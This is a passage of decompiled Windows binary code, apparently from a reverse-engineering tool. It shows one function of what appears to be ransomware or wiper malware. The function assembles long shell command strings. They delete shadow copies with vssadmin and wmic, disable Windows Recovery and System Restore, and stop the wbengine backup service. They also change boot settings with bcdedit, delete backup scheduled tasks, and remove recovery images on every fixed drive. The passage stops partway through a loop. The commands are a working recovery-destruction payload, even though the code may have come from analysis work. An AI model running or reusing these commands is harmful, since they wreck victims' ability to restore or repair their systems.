
/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

void FUN_1400106a0(void)

{
  code *pcVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined8 uVar5;
  undefined1 *puVar6;
  undefined8 ****ppppuVar7;
  UINT UVar8;
  size_t sVar9;
  longlong *plVar10;
  char *****pppppcVar11;
  undefined8 *****pppppuVar12;
  undefined8 *****pppppuVar13;
  longlong lVar14;
  char ****ppppcVar15;
  char *pcVar16;
  ulonglong uVar17;
  char ****ppppcVar18;
  undefined1 *puVar19;
  ulonglong uVar20;
  char *****unaff_RBX;
  undefined1 *puVar21;
  undefined1 *puVar22;
  undefined1 *puVar23;
  undefined1 *puVar24;
  undefined1 *puVar25;
  undefined1 *puVar26;
  undefined1 *puVar27;
  undefined1 *puVar28;
  undefined1 *puVar29;
  int iVar30;
  undefined **ppuVar31;
  longlong lVar32;
  char *pcVar33;
  IMAGE_DOS_HEADER *pIVar34;
  uint uVar35;
  char *****pppppcVar36;
  char *****pppppcVar37;
  undefined8 uStack_390;
  undefined1 auStack_388 [8];
  undefined1 auStack_380 [24];
  char *local_368;
  char ***local_360 [4];
  undefined8 local_340;
  undefined8 uStack_338;
  char ***local_330;
  ulonglong uStack_328;
  undefined8 ****local_320;
  longlong alStack_318 [3];
  undefined8 ****local_300;
  undefined8 uStack_2f8;
  undefined8 local_2f0;
  ulonglong local_2e8;
  longlong local_2e0 [3];
  ulonglong local_2c8;
  char ****local_2c0;
  undefined8 uStack_2b8;
  longlong local_2b0;
  ulonglong uStack_2a8;
  char ****local_2a0;
  undefined8 uStack_298;
  longlong local_290;
  ulonglong uStack_288;
  char ****local_280;
  undefined8 uStack_278;
  longlong local_270;
  ulonglong uStack_268;
  char ***local_258 [64];
  ulonglong local_58;
  
  puVar21 = auStack_388;
  puVar22 = auStack_388;
  puVar23 = auStack_388;
  puVar24 = auStack_388;
  puVar25 = auStack_388;
  puVar26 = auStack_388;
  puVar27 = auStack_388;
  puVar28 = auStack_388;
  local_58 = DAT_140068100 ^ (ulonglong)auStack_388;
  pppppcVar37 = (char *****)0x0;
  local_300 = (undefined8 ****)0x0;
  uStack_2f8 = 0;
  local_2f0 = 0;
  local_2e8 = 0;
  local_300 = (undefined8 ****)FUN_1400269b0(0x360);
  local_2f0 = 0x35f;
  local_2e8 = 0x35f;
  lVar32 = 6;
  pppppuVar12 = (undefined8 *****)local_300;
  pcVar33 = 
  "reagentc /disable >nul 2>&1 & rd /s /q \"C:\\Recovery\" >nul 2>&1 & rd /s /q \"%SystemDrive%\\Recovery\" >nul 2>&1 & vssadmin delete shadows /all /quiet >nul 2>&1 & wmic shadowcopy delete /nointeractive >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableConfig /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f >nul 2>&1 & rd /s /q \"C:\\Windows\\System32\\Recovery\" >nul 2>&1 & sc config \"wbengine\" start= disabled >nul 2>&1 & sc stop \"wbengine\" >nul 2>&1 & del /f /q \"%SystemRoot%\\System32\\ResetEngine.exe\" >nul 2>&1 & del /f /q \"%SystemRoot%\\System32\\pbr.exe\" >nul 2>&1 & del /f /q \"%SystemRoot%\\System32\\recenv.exe\" >nul 2>&1"
  ;
  do {
    pcVar16 = pcVar33;
    pppppuVar13 = pppppuVar12;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 8);
    *pppppuVar13 = *(undefined8 *****)pcVar16;
    pppppuVar13[1] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x18);
    pppppuVar13[2] = *(undefined8 *****)(pcVar16 + 0x10);
    pppppuVar13[3] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x28);
    pppppuVar13[4] = *(undefined8 *****)(pcVar16 + 0x20);
    pppppuVar13[5] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x38);
    pppppuVar13[6] = *(undefined8 *****)(pcVar16 + 0x30);
    pppppuVar13[7] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x48);
    pppppuVar13[8] = *(undefined8 *****)(pcVar16 + 0x40);
    pppppuVar13[9] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x58);
    pppppuVar13[10] = *(undefined8 *****)(pcVar16 + 0x50);
    pppppuVar13[0xb] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x68);
    pppppuVar13[0xc] = *(undefined8 *****)(pcVar16 + 0x60);
    pppppuVar13[0xd] = ppppuVar7;
    ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x78);
    pppppuVar13[0xe] = *(undefined8 *****)(pcVar16 + 0x70);
    pppppuVar13[0xf] = ppppuVar7;
    lVar32 = lVar32 + -1;
    pppppuVar12 = pppppuVar13 + 0x10;
    pcVar33 = pcVar16 + 0x80;
  } while (lVar32 != 0);
  ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x88);
  pppppuVar13[0x10] = *(undefined8 *****)(pcVar16 + 0x80);
  pppppuVar13[0x11] = ppppuVar7;
  ppppuVar7 = *(undefined8 *****)(pcVar16 + 0x98);
  pppppuVar13[0x12] = *(undefined8 *****)(pcVar16 + 0x90);
  pppppuVar13[0x13] = ppppuVar7;
  ppppuVar7 = *(undefined8 *****)(pcVar16 + 0xa8);
  pppppuVar13[0x14] = *(undefined8 *****)(pcVar16 + 0xa0);
  pppppuVar13[0x15] = ppppuVar7;
  ppppuVar7 = *(undefined8 *****)(pcVar16 + 0xb8);
  pppppuVar13[0x16] = *(undefined8 *****)(pcVar16 + 0xb0);
  pppppuVar13[0x17] = ppppuVar7;
  uVar2 = *(undefined4 *)(pcVar16 + 0xc4);
  uVar3 = *(undefined4 *)(pcVar16 + 200);
  uVar4 = *(undefined4 *)(pcVar16 + 0xcc);
  *(undefined4 *)(pppppuVar13 + 0x18) = *(undefined4 *)(pcVar16 + 0xc0);
  *(undefined4 *)((longlong)pppppuVar13 + 0xc4) = uVar2;
  *(undefined4 *)(pppppuVar13 + 0x19) = uVar3;
  *(undefined4 *)((longlong)pppppuVar13 + 0xcc) = uVar4;
  uVar5 = *(undefined8 *)(pcVar16 + 0xd7);
  *(undefined8 *)((longlong)pppppuVar13 + 0xcf) = *(undefined8 *)(pcVar16 + 0xcf);
  *(undefined8 *)((longlong)pppppuVar13 + 0xd7) = uVar5;
  *(undefined1 *)((longlong)local_300 + 0x35f) = 0;
  pppppcVar36 = pppppcVar37;
  do {
    ppuVar31 = &PTR_s_wbengine_14005e188 + (int)pppppcVar36;
    local_2c0 = (char ****)0x0;
    uStack_2b8 = 0;
    local_2b0 = 0;
    uStack_2a8 = 0;
    sVar9 = strlen(*ppuVar31);
    FUN_140017f00(&local_2c0,*ppuVar31,sVar9);
    if (uStack_2a8 - local_2b0 < 0xc) {
      local_360[0] = (char ***)0xc;
      local_368 = " & sc stop \"";
      pppppcVar11 = (char *****)FUN_14001b810(&local_2c0,0xc);
    }
    else {
      unaff_RBX = &local_2c0;
      if (0xf < uStack_2a8) {
        unaff_RBX = (char *****)local_2c0;
      }
      if (((char *****)0x14005cc0b < unaff_RBX) ||
         ((char *)((longlong)unaff_RBX + local_2b0) < " & sc stop \"")) {
        pppppcVar11 = (char *****)0xc;
      }
      else {
        pppppcVar11 = pppppcVar37;
        if (" & sc stop \"" < unaff_RBX) {
          pppppcVar11 = unaff_RBX + -0x2800b980;
        }
      }
      lVar32 = local_2b0 + 1;
      local_2b0 = local_2b0 + 0xc;
      FUN_140048960((char *)((longlong)unaff_RBX + 0xc),unaff_RBX,lVar32);
      FUN_140048960(unaff_RBX," & sc stop \"",pppppcVar11);
      FUN_140048960((char *)((longlong)unaff_RBX + (longlong)pppppcVar11),
                    (char *)((longlong)pppppcVar11 + 0x14005cc0c),0xc - (longlong)pppppcVar11);
      pppppcVar11 = &local_2c0;
    }
    local_340 = (char ****)0x0;
    uStack_338 = (char ****)0x0;
    local_330 = (char ***)0x0;
    uStack_328 = 0;
    local_340 = *pppppcVar11;
    uStack_338 = pppppcVar11[1];
    local_330 = (char ***)pppppcVar11[2];
    uStack_328 = (ulonglong)pppppcVar11[3];
    pppppcVar11[2] = (char ****)0x0;
    pppppcVar11[3] = (char ****)0xf;
    *(undefined1 *)pppppcVar11 = 0;
    plVar10 = (longlong *)FUN_1400183c0(&local_340,"\" >nul 2>&1",0xb);
    local_320 = (undefined8 ****)*plVar10;
    alStack_318[0] = plVar10[1];
    lVar32 = plVar10[2];
    alStack_318[2] = plVar10[3];
    plVar10[2] = 0;
    plVar10[3] = 0xf;
    *(undefined1 *)plVar10 = 0;
    pppppuVar12 = &local_320;
    if (0xf < (ulonglong)alStack_318[2]) {
      pppppuVar12 = (undefined8 *****)local_320;
    }
    alStack_318[1] = lVar32;
    FUN_1400183c0(&local_300,pppppuVar12,lVar32);
    iVar30 = (int)ppuVar31;
    if (0xf < (ulonglong)alStack_318[2]) {
      uVar17 = alStack_318[2] + 1;
      pppppuVar12 = (undefined8 *****)local_320;
      if (uVar17 < 0x1000) {
LAB_140010982:
        FUN_140026c34(pppppuVar12,uVar17);
        goto LAB_140010988;
      }
      pppppuVar12 = (undefined8 *****)local_320[-1];
      if ((ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12)) < 0x20) {
        uVar17 = alStack_318[2] + 0x28;
        goto LAB_140010982;
      }
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
      puVar21 = auStack_380;
LAB_14001138e:
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
      puVar22 = puVar21 + 8;
LAB_140011395:
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
      puVar23 = puVar22 + 8;
LAB_14001139c:
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)(5);
      puVar24 = puVar23 + 8;
      pIVar34 = (IMAGE_DOS_HEADER *)" & sc stop \"";
      goto LAB_1400113a3;
    }
LAB_140010988:
    if ((char ****)0xf < uStack_328) {
      ppppcVar18 = (char ****)(uStack_328 + 1);
      ppppcVar15 = local_340;
      if ((char ****)0xfff < ppppcVar18) {
        ppppcVar15 = (char ****)local_340[-1];
        if (0x1f < (ulonglong)((longlong)local_340 + (-8 - (longlong)ppppcVar15)))
        goto LAB_14001138e;
        ppppcVar18 = (char ****)(uStack_328 + 0x28);
      }
      FUN_140026c34(ppppcVar15,ppppcVar18);
    }
    local_330 = (char ***)0x0;
    uStack_328 = 0xf;
    local_340 = (char ****)((ulonglong)local_340 & 0xffffffffffffff00);
    if (0xf < uStack_2a8) {
      uVar17 = uStack_2a8 + 1;
      pppppcVar11 = (char *****)local_2c0;
      if (0xfff < uVar17) {
        pppppcVar11 = (char *****)local_2c0[-1];
        puVar29 = auStack_388;
        if ((char *)0x1f < (char *)((longlong)local_2c0 + (-8 - (longlong)pppppcVar11)))
        goto LAB_1400115f6;
        uVar17 = uStack_2a8 + 0x28;
      }
      FUN_140026c34(pppppcVar11,uVar17);
    }
    local_2a0 = (char ****)0x0;
    uStack_298 = 0;
    local_290 = 0;
    uStack_288 = 0;
    sVar9 = strlen(*ppuVar31);
    FUN_140017f00(&local_2a0,*ppuVar31,sVar9);
    if (uStack_288 - local_290 < 0xe) {
      local_360[0] = (char ***)0xe;
      local_368 = " & sc config \"";
      pppppcVar11 = (char *****)FUN_14001b810(&local_2a0,0xe);
    }
    else {
      unaff_RBX = &local_2a0;
      if (0xf < uStack_288) {
        unaff_RBX = (char *****)local_2a0;
      }
      if (((char *****)0x14005cc3d < unaff_RBX) ||
         ((char *)((longlong)unaff_RBX + local_290) < " & sc config \"")) {
        pppppcVar11 = (char *****)0xe;
      }
      else {
        pppppcVar11 = pppppcVar37;
        if (" & sc config \"" < unaff_RBX) {
          pppppcVar11 = unaff_RBX + -0x2800b986;
        }
      }
      lVar32 = local_290 + 1;
      local_290 = local_290 + 0xe;
      FUN_140048960((char *)((longlong)unaff_RBX + 0xe),unaff_RBX,lVar32);
      FUN_140048960(unaff_RBX," & sc config \"",pppppcVar11);
      FUN_140048960((char *)((longlong)unaff_RBX + (longlong)pppppcVar11),
                    (char *)((longlong)pppppcVar11 + 0x14005cc3e),0xe - (longlong)pppppcVar11);
      pppppcVar11 = &local_2a0;
    }
    local_340 = (char ****)0x0;
    uStack_338 = (char ****)0x0;
    local_330 = (char ***)0x0;
    uStack_328 = 0;
    local_340 = *pppppcVar11;
    uStack_338 = pppppcVar11[1];
    local_330 = (char ***)pppppcVar11[2];
    uStack_328 = (ulonglong)pppppcVar11[3];
    pppppcVar11[2] = (char ****)0x0;
    pppppcVar11[3] = (char ****)0xf;
    *(undefined1 *)pppppcVar11 = 0;
    plVar10 = (longlong *)FUN_1400183c0(&local_340,"\" start= disabled >nul 2>&1",0x1b);
    local_320 = (undefined8 ****)*plVar10;
    alStack_318[0] = plVar10[1];
    lVar32 = plVar10[2];
    alStack_318[2] = plVar10[3];
    plVar10[2] = 0;
    plVar10[3] = 0xf;
    *(undefined1 *)plVar10 = 0;
    pppppuVar12 = &local_320;
    if (0xf < (ulonglong)alStack_318[2]) {
      pppppuVar12 = (undefined8 *****)local_320;
    }
    alStack_318[1] = lVar32;
    FUN_1400183c0(&local_300,pppppuVar12,lVar32);
    if (0xf < (ulonglong)alStack_318[2]) {
      uVar17 = alStack_318[2] + 1;
      pppppuVar12 = (undefined8 *****)local_320;
      if (0xfff < uVar17) {
        pppppuVar12 = (undefined8 *****)local_320[-1];
        if (0x1f < (ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12)))
        goto LAB_140011395;
        uVar17 = alStack_318[2] + 0x28;
      }
      FUN_140026c34(pppppuVar12,uVar17);
    }
    if ((char ****)0xf < uStack_328) {
      ppppcVar18 = (char ****)(uStack_328 + 1);
      ppppcVar15 = local_340;
      if ((char ****)0xfff < ppppcVar18) {
        ppppcVar15 = (char ****)local_340[-1];
        if (0x1f < (ulonglong)((longlong)local_340 + (-8 - (longlong)ppppcVar15)))
        goto LAB_14001139c;
        ppppcVar18 = (char ****)(uStack_328 + 0x28);
      }
      FUN_140026c34(ppppcVar15,ppppcVar18);
    }
    local_330 = (char ***)0x0;
    uStack_328 = 0xf;
    local_340 = (char ****)((ulonglong)local_340 & 0xffffffffffffff00);
    if (0xf < uStack_288) {
      uVar17 = uStack_288 + 1;
      pppppcVar11 = (char *****)local_2a0;
      if (0xfff < uVar17) {
        pppppcVar11 = (char *****)local_2a0[-1];
        puVar29 = auStack_388;
        if ((char *)0x1f < (char *)((longlong)local_2a0 + (-8 - (longlong)pppppcVar11)))
        goto LAB_1400115f6;
        uVar17 = uStack_288 + 0x28;
      }
      FUN_140026c34(pppppcVar11,uVar17);
    }
    uVar35 = (int)pppppcVar36 + 1;
    pppppcVar36 = (char *****)(ulonglong)uVar35;
  } while ((&PTR_s_wbengine_14005e188)[(int)uVar35] != (undefined *)0x0);
  pIVar34 = &IMAGE_DOS_HEADER_140000000;
  FUN_1400183c0(&local_300,
                " & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CloudContent\" /v DisableWindowsConsumerFeatures /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v NoRepairOptions /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v DisableAdvancedStartupOptions /t REG_DWORD /d 1 /f >nul 2>&1 & REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v WINREFLAGS /t REG_DWORD /d 0 /f >nul 2>&1 & bcdedit /set {default} bootmenupolicy standard >nul 2>&1 & bcdedit /set {default} recoveryenabled No >nul 2>&1 & bcdedit /set {bootmgr} displaybootmenu no >nul 2>&1 & bcdedit /set {bootmgr} timeout 0 >nul 2>&1 & bcdedit /set {globalsettings} advancedoptions false >nul 2>&1 & bcdedit /set {globalsettings} optionsedit false >nul 2>&1 & schtasks /delete /tn \"\\Microsoft\\Windows\\RecoveryEnvironment\\VerifyWinRE\" /f >nul 2>&1 & schtasks /delete /tn \"\\Microsoft\\Windows\\WindowsBackup\\AutomaticBackup\" /f >nul 2>&1 & schtasks /delete /tn \"\\Microsoft\\Windows\\WindowsBackup\\Windows Backup Monitor\" /f >nul 2>&1"
                ,0x455);
  FUN_140049100(local_258,0,0x200);
  GetLogicalDriveStringsA(0x200,(LPSTR)local_258);
  unaff_RBX = (char *****)local_258;
  while ((CHAR)local_258[0] != '\0') {
    UVar8 = GetDriveTypeA((LPCSTR)unaff_RBX);
    if (UVar8 == 3) {
      local_340 = (char ****)0x0;
      uStack_338 = (char ****)0x0;
      local_330 = (char ***)0x0;
      uStack_328 = 0;
      FUN_140017f00(&local_340,unaff_RBX,1);
      if (0x7fffffffffffffffU - (longlong)local_330 < 0xe) {
                    /* WARNING: Subroutine does not return */
        FUN_140008850();
      }
      local_360[0] = (char ***)&local_340;
      if ((char ****)0xf < uStack_328) {
        local_360[0] = (char ***)local_340;
      }
      local_360[1] = local_330;
      local_368 = (char *)0xe;
      FUN_140019110(local_2e0);
      plVar10 = (longlong *)FUN_1400183c0(local_2e0,":\\sources\\install.wim\" >nul 2>&1",0x20);
      local_320 = (undefined8 ****)*plVar10;
      alStack_318[0] = plVar10[1];
      lVar32 = plVar10[2];
      alStack_318[2] = plVar10[3];
      plVar10[2] = 0;
      plVar10[3] = 0xf;
      *(undefined1 *)plVar10 = 0;
      pppppuVar12 = &local_320;
      if (0xf < (ulonglong)alStack_318[2]) {
        pppppuVar12 = (undefined8 *****)local_320;
      }
      alStack_318[1] = lVar32;
      FUN_1400183c0(&local_300,pppppuVar12,lVar32);
      if (0xf < (ulonglong)alStack_318[2]) {
        uVar17 = alStack_318[2] + 1;
        pppppuVar12 = (undefined8 *****)local_320;
        if (0xfff < uVar17) {
          pppppuVar12 = (undefined8 *****)local_320[-1];
          if (0x1f < (ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12))) {
LAB_1400113a3:
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar25 = puVar24 + 8;
LAB_1400113aa:
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar26 = puVar25 + 8;
LAB_1400113b1:
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar27 = puVar26 + 8;
LAB_1400113b8:
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar28 = puVar27 + 8;
LAB_1400113bf:
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar29 = puVar28 + 8;
LAB_1400113c6:
            pcVar33 = " & sc config \"";
            pcVar1 = (code *)swi(0x29);
            (*pcVar1)(5);
            puVar29 = puVar29 + 8;
            goto LAB_1400113cd;
          }
          uVar17 = alStack_318[2] + 0x28;
        }
        FUN_140026c34(pppppuVar12,uVar17);
      }
      if (0xf < local_2c8) {
        uVar17 = local_2c8 + 1;
        lVar14 = local_2e0[0];
        if (0xfff < uVar17) {
          lVar14 = *(longlong *)(local_2e0[0] + -8);
          puVar29 = auStack_388;
          if (0x1f < (local_2e0[0] - lVar14) - 8U) goto LAB_1400113c6;
          uVar17 = local_2c8 + 0x28;
        }
        FUN_140026c34(lVar14,uVar17);
      }
      if (0x7fffffffffffffffU - (longlong)local_330 < 0xe) {
                    /* WARNING: Subroutine does not return */
        FUN_140008850();
      }
      local_360[0] = (char ***)&local_340;
      if ((char ****)0xf < uStack_328) {
        local_360[0] = (char ***)local_340;
      }
      local_360[1] = local_330;
      local_368 = (char *)0xe;
      FUN_140019110(local_2e0);
      plVar10 = (longlong *)FUN_1400183c0(local_2e0,":\\sources\\install.esd\" >nul 2>&1",0x20);
      local_320 = (undefined8 ****)*plVar10;
      alStack_318[0] = plVar10[1];
      lVar32 = plVar10[2];
      alStack_318[2] = plVar10[3];
      plVar10[2] = 0;
      plVar10[3] = 0xf;
      *(undefined1 *)plVar10 = 0;
      pppppuVar12 = &local_320;
      if (0xf < (ulonglong)alStack_318[2]) {
        pppppuVar12 = (undefined8 *****)local_320;
      }
      alStack_318[1] = lVar32;
      FUN_1400183c0(&local_300,pppppuVar12,lVar32);
      if (0xf < (ulonglong)alStack_318[2]) {
        uVar17 = alStack_318[2] + 1;
        pppppuVar12 = (undefined8 *****)local_320;
        if (0xfff < uVar17) {
          pppppuVar12 = (undefined8 *****)local_320[-1];
          if (0x1f < (ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12)))
          goto LAB_1400113aa;
          uVar17 = alStack_318[2] + 0x28;
        }
        FUN_140026c34(pppppuVar12,uVar17);
      }
      if (0xf < local_2c8) {
        uVar17 = local_2c8 + 1;
        lVar14 = local_2e0[0];
        if (0xfff < uVar17) {
          lVar14 = *(longlong *)(local_2e0[0] + -8);
          puVar29 = auStack_388;
          if (0x1f < (local_2e0[0] - lVar14) - 8U) goto LAB_1400113c6;
          uVar17 = local_2c8 + 0x28;
        }
        FUN_140026c34(lVar14,uVar17);
      }
      if (0x7fffffffffffffffU - (longlong)local_330 < 0xe) {
                    /* WARNING: Subroutine does not return */
        FUN_140008850();
      }
      local_360[0] = (char ***)&local_340;
      if ((char ****)0xf < uStack_328) {
        local_360[0] = (char ***)local_340;
      }
      local_360[1] = local_330;
      local_368 = (char *)0xe;
      FUN_140019110(local_2e0);
      plVar10 = (longlong *)
                FUN_1400183c0(local_2e0,":\\Windows\\System32\\Recovery\\winre.wim\" >nul 2>&1",0x30
                             );
      local_320 = (undefined8 ****)*plVar10;
      alStack_318[0] = plVar10[1];
      lVar32 = plVar10[2];
      alStack_318[2] = plVar10[3];
      plVar10[2] = 0;
      plVar10[3] = 0xf;
      *(undefined1 *)plVar10 = 0;
      pppppuVar12 = &local_320;
      if (0xf < (ulonglong)alStack_318[2]) {
        pppppuVar12 = (undefined8 *****)local_320;
      }
      alStack_318[1] = lVar32;
      FUN_1400183c0(&local_300,pppppuVar12,lVar32);
      if (0xf < (ulonglong)alStack_318[2]) {
        uVar17 = alStack_318[2] + 1;
        pppppuVar12 = (undefined8 *****)local_320;
        if (0xfff < uVar17) {
          pppppuVar12 = (undefined8 *****)local_320[-1];
          if (0x1f < (ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12)))
          goto LAB_1400113b1;
          uVar17 = alStack_318[2] + 0x28;
        }
        FUN_140026c34(pppppuVar12,uVar17);
      }
      if (0xf < local_2c8) {
        uVar17 = local_2c8 + 1;
        lVar14 = local_2e0[0];
        if (0xfff < uVar17) {
          lVar14 = *(longlong *)(local_2e0[0] + -8);
          puVar29 = auStack_388;
          if (0x1f < (local_2e0[0] - lVar14) - 8U) goto LAB_1400113c6;
          uVar17 = local_2c8 + 0x28;
        }
        FUN_140026c34(lVar14,uVar17);
      }
      if (0x7fffffffffffffffU - (longlong)local_330 < 0xd) {
                    /* WARNING: Subroutine does not return */
        FUN_140008850();
      }
      local_360[0] = (char ***)&local_340;
      if ((char ****)0xf < uStack_328) {
        local_360[0] = (char ***)local_340;
      }
      local_360[1] = local_330;
      local_368 = (char *)0xd;
      FUN_140019110(local_2e0);
      plVar10 = (longlong *)FUN_1400183c0(local_2e0,":\\$WinREAgent\" >nul 2>&1",0x18);
      local_320 = (undefined8 ****)*plVar10;
      alStack_318[0] = plVar10[1];
      lVar32 = plVar10[2];
      alStack_318[2] = plVar10[3];
      plVar10[2] = 0;
      plVar10[3] = 0xf;
      *(undefined1 *)plVar10 = 0;
      pppppuVar12 = &local_320;
      if (0xf < (ulonglong)alStack_318[2]) {
        pppppuVar12 = (undefined8 *****)local_320;
      }
      alStack_318[1] = lVar32;
      FUN_1400183c0(&local_300,pppppuVar12,lVar32);
      if (0xf < (ulonglong)alStack_318[2]) {
        uVar17 = alStack_318[2] + 1;
        pppppuVar12 = (undefined8 *****)local_320;
        if (0xfff < uVar17) {
          pppppuVar12 = (undefined8 *****)local_320[-1];
          if (0x1f < (ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12)))
          goto LAB_1400113b8;
          uVar17 = alStack_318[2] + 0x28;
        }
        FUN_140026c34(pppppuVar12,uVar17);
      }
      if (0xf < local_2c8) {
        uVar17 = local_2c8 + 1;
        lVar14 = local_2e0[0];
        if (0xfff < uVar17) {
          lVar14 = *(longlong *)(local_2e0[0] + -8);
          puVar29 = auStack_388;
          if (0x1f < (local_2e0[0] - lVar14) - 8U) goto LAB_1400113c6;
          uVar17 = local_2c8 + 0x28;
        }
        FUN_140026c34(lVar14,uVar17);
      }
      if (0x7fffffffffffffffU - (longlong)local_330 < 0xd) {
                    /* WARNING: Subroutine does not return */
        FUN_140008850();
      }
      local_360[0] = (char ***)&local_340;
      if ((char ****)0xf < uStack_328) {
        local_360[0] = (char ***)local_340;
      }
      local_360[1] = local_330;
      local_368 = (char *)0xd;
      FUN_140019110(local_2e0);
      plVar10 = (longlong *)FUN_1400183c0(local_2e0,":\\Recovery\" >nul 2>&1",0x15);
      local_320 = (undefined8 ****)*plVar10;
      alStack_318[0] = plVar10[1];
      lVar32 = plVar10[2];
      alStack_318[2] = plVar10[3];
      plVar10[2] = 0;
      plVar10[3] = 0xf;
      *(undefined1 *)plVar10 = 0;
      pppppuVar12 = &local_320;
      if (0xf < (ulonglong)alStack_318[2]) {
        pppppuVar12 = (undefined8 *****)local_320;
      }
      alStack_318[1] = lVar32;
      FUN_1400183c0(&local_300,pppppuVar12,lVar32);
      if (0xf < (ulonglong)alStack_318[2]) {
        uVar17 = alStack_318[2] + 1;
        pppppuVar12 = (undefined8 *****)local_320;
        if (0xfff < uVar17) {
          pppppuVar12 = (undefined8 *****)local_320[-1];
          if (0x1f < (ulonglong)((longlong)local_320 + (-8 - (longlong)pppppuVar12)))
          goto LAB_1400113bf;
          uVar17 = alStack_318[2] + 0x28;
        }
        FUN_140026c34(pppppuVar12,uVar17);
      }
      if (0xf < local_2c8) {
        uVar17 = local_2c8 + 1;
        lVar14 = local_2e0[0];
        if (0xfff < uVar17) {
          lVar14 = *(longlong *)(local_2e0[0] + -8);
          puVar29 = auStack_388;
          if (0x1f < (local_2e0[0] - lVar14) - 8U) goto LAB_1400113c6;
          uVar17 = local_2c8 + 0x28;
        }
        FUN_140026c34(lVar14,uVar17);
      }
      if ((char ****)0xf < uStack_328) {
        ppppcVar18 = (char ****)(uStack_328 + 1);
        ppppcVar15 = local_340;
        if ((char ****)0xfff < ppppcVar18) {
          ppppcVar15 = (char ****)local_340[-1];
          puVar29 = auStack_388;
          if (0x1f < (ulonglong)((longlong)local_340 + (-8 - (longlong)ppppcVar15)))
          goto LAB_1400115f6;
          ppppcVar18 = (char ****)(uStack_328 + 0x28);
        }
        FUN_140026c34(ppppcVar15,ppppcVar18);
      }
    }
    sVar9 = strlen((char *)unaff_RBX);
    unaff_RBX = (char *****)((longlong)unaff_RBX + sVar9 + 1);
    local_258[0]._0_1_ = *(CHAR *)unaff_RBX;
  }
  pcVar33 = &DAT_14005d1ab;
  pppppcVar36 = (char *****)&DAT_14005d1a0;
  puVar29 = auStack_388;
  pppppcVar11 = pppppcVar37;
  while( true ) {
    iVar30 = (int)pppppcVar11;
    pcVar16 = *(char **)(pIVar34[0xbc1].e_program + (longlong)iVar30 * 8 + 0x18);
    local_280 = (char ****)0x0;
    uStack_278 = 0;
    local_270 = 0;
    uStack_268 = 0;
    *(undefined8 *)(puVar29 + -8) = 0x140011332;
    sVar9 = strlen(pcVar16);
    *(undefined8 *)(puVar29 + -8) = 0x140011341;
    FUN_140017f00(&local_280,pcVar16,sVar9);
    if (uStack_268 - local_270 < 0xb) {
      *(undefined8 *)(puVar29 + 0x28) = 0xb;
      *(char ******)(puVar29 + 0x20) = pppppcVar36;
      *(undefined8 *)(puVar29 + -8) = 0x140011432;
      pppppcVar11 = (char *****)FUN_14001b810(&local_280,0xb);
    }
    else {
      lVar14 = local_270 + 0xb;
      unaff_RBX = &local_280;
      if (0xf < uStack_268) {
        unaff_RBX = (char *****)local_280;
      }
      lVar32 = local_270;
      if ((unaff_RBX < pcVar33) && (pppppcVar36 <= (char *****)((longlong)unaff_RBX + local_270))) {
        pppppcVar11 = pppppcVar37;
        local_270 = lVar14;
        if (pppppcVar36 < unaff_RBX) {
LAB_1400113cd:
          pppppcVar11 = (char *****)((longlong)unaff_RBX - (longlong)pppppcVar36);
        }
      }
      else {
        pppppcVar11 = (char *****)0xb;
        local_270 = lVar14;
      }
      *(undefined8 *)(puVar29 + -8) = 0x1400113e9;
      FUN_140048960((char *)((longlong)unaff_RBX + 0xb),unaff_RBX,lVar32 + 1);
      *(undefined8 *)(puVar29 + -8) = 0x1400113f7;
      FUN_140048960(unaff_RBX,pppppcVar36,pppppcVar11);
      *(undefined8 *)(puVar29 + -8) = 0x140011410;
      FUN_140048960((char *)((longlong)unaff_RBX + (longlong)pppppcVar11),
                    (char *)((longlong)pppppcVar36 + 0xb) + (longlong)pppppcVar11,
                    0xb - (longlong)pppppcVar11);
      pppppcVar11 = &local_280;
    }
    *(undefined8 *)(puVar29 + 0x48) = 0;
    *(undefined8 *)(puVar29 + 0x50) = 0;
    *(undefined8 *)(puVar29 + 0x58) = 0;
    *(undefined8 *)(puVar29 + 0x60) = 0;
